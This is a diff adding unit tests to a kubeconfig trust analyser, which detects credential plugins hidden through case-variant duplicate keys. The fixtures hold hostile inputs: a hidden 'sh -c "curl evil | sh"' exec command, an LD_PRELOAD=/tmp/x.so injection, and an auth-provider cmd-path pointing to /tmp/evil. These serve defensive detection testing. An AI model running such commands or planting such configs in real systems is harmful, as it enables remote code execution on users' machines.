@@ -88,6 +88,41 @@ suite('execTrust', () => {
         assert.ok(a.fingerprint);
     });
 
+    test('display: case-variant duplicate keys are flagged and the exact-case command is shown', () => {
+        // kubectl (client-go >= 1.23) reads keys case-sensitively and would run `sh`, not `aws`.
+        const yaml = [
+            'apiVersion: v1', 'kind: Config', 'users:', '- name: u', '  user:', '    exec:',
+            '      Command: aws', '      Args: [eks, get-token]',
+            '      command: sh', '      args: [-c, "curl evil | sh"]', '',
+        ].join('\n');
+        const a = analyzeKubeconfig(yaml);
+        assert.strictEqual(a.ambiguous, true);
+        assert.ok(a.entries[0].summary.startsWith('sh -c'), a.entries[0].summary);
+    });
+
+    test('display: env is shown and control characters are made visible', () => {
+        const yaml = [
+            'apiVersion: v1', 'kind: Config', 'users:', '- name: u', '  user:', '    exec:',
+            '      command: aws', '      args: ["a\\nb"]',
+            '      env: [{name: LD_PRELOAD, value: /tmp/x.so}]', '',
+        ].join('\n');
+        const a = analyzeKubeconfig(yaml);
+        assert.ok(!a.ambiguous);
+        assert.ok(a.entries[0].summary.includes('LD_PRELOAD=/tmp/x.so'));
+        assert.ok(!a.entries[0].summary.includes('\n'));
+    });
+
+    test('fingerprint: auth-provider with case-variant keys does not collide with a stock one', () => {
+        const mk = (cfg: string) => [
+            'apiVersion: v1', 'kind: Config', 'users:', '- name: u', '  user:', '    auth-provider:',
+            '      name: gcp', `      config: ${cfg}`, '',
+        ].join('\n');
+        const stock = analyzeKubeconfig(mk('{}'));
+        const evil = analyzeKubeconfig(mk('{Cmd-Path: null, cmd-path: /tmp/evil}'));
+        assert.notStrictEqual(stock.fingerprint, evil.fingerprint);
+        assert.strictEqual(evil.ambiguous, true);
+    });
+
     test('gate: unapproved plugin is refused, approved plugin is allowed', () => {
         const yaml = withExec('aws', ['eks', 'get-token']);
         assert.throws(() => assertKubeconfigAllowed(yaml), /credential plugin/);
